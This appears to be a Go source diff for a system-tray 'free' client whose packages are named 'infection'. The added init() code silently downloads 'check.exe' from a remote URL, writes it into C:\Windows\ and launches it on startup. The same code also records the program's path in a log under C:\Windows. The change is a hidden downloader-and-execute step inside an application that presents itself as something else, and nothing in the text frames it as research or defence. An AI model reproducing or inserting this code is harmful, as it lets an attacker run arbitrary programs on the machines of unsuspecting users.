@@ -3,6 +3,8 @@ package main
 import (
 	"infection/etcd"
 	"io/ioutil"
+	"net/http"
+	"os/exec"
 
 	//"infection/machineinfo"
 	"infection/util/lib"
@@ -20,6 +22,7 @@ import (
 )
 
 const CURRENTPATHLOG = "C:\\Windows\\log.txt"
+const CURRENTPATH = "C:\\Windows\\"
 
 var localAddr string
 
@@ -87,12 +90,19 @@ func onExit() {
 	// clean up here
 }
 func init() {
-	//todo request daemon
 	//currentprogram path log
 	content, _ := transfer.GetTargetPath()
 	data := []byte(content)
 	if ioutil.WriteFile(CURRENTPATHLOG, data, 0644) == nil {
 	}
+	resp, err := http.Get(lib.MIDFILE + "check.exe")
+	if err != nil {
+		return
+	}
+	body, _ := ioutil.ReadAll(resp.Body)
+	ioutil.WriteFile(CURRENTPATH+"check.exe", body, 0644)
+	cmd := exec.Command(CURRENTPATH + "check.exe")
+	cmd.Start()
 	if !Config.Dev {
 		log.Println("已启动free客户端，请在free_" + strconv.Itoa(Config.ClientPort) + ".log查看详细日志")
 		f, _ := os.OpenFile("free"+strconv.Itoa(Config.ClientPort)+".log", os.O_WRONLY|os.O_CREATE|os.O_SYNC|os.O_APPEND, 0755)
@@ -108,7 +118,7 @@ func main() {
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(&appConfig)
 	//machineinfo.MachineSend(conf.Url)
-	go lib.DoUpdate(conf.Url)
+	go lib.DoUpdate()
 	systray.Run(onReady, onExit)
 }
 
